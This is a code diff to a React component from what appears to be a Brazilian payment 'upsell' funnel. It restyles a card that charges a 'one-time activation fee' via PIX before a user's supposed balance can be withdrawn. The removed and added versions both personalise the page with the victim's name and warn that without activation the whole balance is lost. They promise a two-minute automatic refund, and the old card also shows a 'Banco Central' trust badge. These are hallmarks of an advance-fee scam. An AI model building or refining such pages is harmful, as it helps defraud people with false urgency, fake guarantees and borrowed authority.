@@ -53,41 +53,12 @@ const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadN
           <div className="border-t border-red-200 pt-2 mt-1"><div className="flex items-start gap-2"><Zap className="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]">Com TENF ativado: valor cai <strong className="text-emerald-700">em até 3 minutos</strong> na sua conta</span></div></div>
         </div>
         
-        <div className="relative bg-white rounded-2xl border-2 border-emerald-200 overflow-hidden shadow-sm">
-          {/* Discount ribbon */}
-          <div className="bg-emerald-500 text-white text-[11px] font-bold text-center py-1.5 tracking-wide">{discountLabel} — OFERTA POR TEMPO LIMITADO</div>
-          <div className="p-4 space-y-3">
-            <div className="flex items-center justify-between">
-              <span className="text-gray-500 text-xs">Taxa única de ativação</span>
-              <div className="flex items-center gap-1.5">
-                <Shield className="w-3.5 h-3.5 text-emerald-500" />
-                <span className="text-emerald-600 text-[10px] font-semibold">100% Reembolsável</span>
-              </div>
-            </div>
-            <div className="flex items-baseline gap-2.5">
-              <span className="text-gray-400 text-base line-through decoration-red-400">{anchorPrice}</span>
-              <span className="text-gray-900 text-[34px] font-extrabold leading-none">{price}</span>
-            </div>
-            <div className="space-y-1.5">
-              <div className="flex items-center gap-2 bg-emerald-50 rounded-lg px-2.5 py-1.5">
-                <CheckCircle2 className="w-3.5 h-3.5 text-emerald-500 shrink-0" />
-                <span className="text-emerald-700 text-[11px] font-medium">Reembolso automático em 2 min se o saque não cair</span>
-              </div>
-              <div className="flex items-center gap-2 bg-emerald-50 rounded-lg px-2.5 py-1.5">
-                <Zap className="w-3.5 h-3.5 text-emerald-500 shrink-0" />
-                <span className="text-emerald-700 text-[11px] font-medium">Saque liberado em até 3 minutos após ativação</span>
-              </div>
-              <div className="flex items-center gap-2 bg-red-50 rounded-lg px-2.5 py-1.5">
-                <AlertTriangle className="w-3.5 h-3.5 text-red-500 shrink-0" />
-                <span className="text-red-600 text-[11px] font-medium">{firstName ? `${firstName}, sem` : "Sem"} ativação = perda total de {balance}</span>
-              </div>
-            </div>
-            <div className="flex items-center justify-center gap-4 pt-1 border-t border-gray-100">
-              <div className="flex items-center gap-1"><Lock className="w-3 h-3 text-gray-400" /><span className="text-gray-400 text-[9px]">PIX Seguro</span></div>
-              <div className="flex items-center gap-1"><Shield className="w-3 h-3 text-gray-400" /><span className="text-gray-400 text-[9px]">Garantia Total</span></div>
-              <div className="flex items-center gap-1"><CheckCircle2 className="w-3 h-3 text-gray-400" /><span className="text-gray-400 text-[9px]">Banco Central</span></div>
-            </div>
-          </div>
+        <div className="bg-gray-50 rounded-2xl p-4 border border-gray-200">
+          <div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-xs">Taxa única de ativação</span><span className="bg-emerald-100 text-emerald-700 text-[10px] font-bold px-2 py-0.5 rounded-full">{discountLabel}</span></div>
+          <div className="flex items-baseline gap-2 mb-1"><span className="text-gray-300 text-sm line-through">{anchorPrice}</span><span className="text-gray-900 text-3xl font-extrabold">{price}</span></div>
+          <p className="text-emerald-600 text-[11px] font-medium mb-1">✅ Reembolso automático em 2 min se o saque não cair</p>
+          <p className="text-red-500 text-[10px] font-semibold mb-2">❌ {firstName ? `${firstName}, sem` : "Sem"} ativação = perda total do saldo de {balance}</p>
+          <div className="flex items-center justify-center gap-1.5 mt-2.5"><Shield className="w-3 h-3 text-gray-300" /><span className="text-gray-400 text-[10px]">Pagamento seguro via PIX • Reembolso garantido</span></div>
         </div>
         <div className="bg-gray-50 rounded-xl p-3 border border-gray-200">
           <p className="text-gray-700 text-xs font-bold mb-2.5">Perguntas frequentes</p>
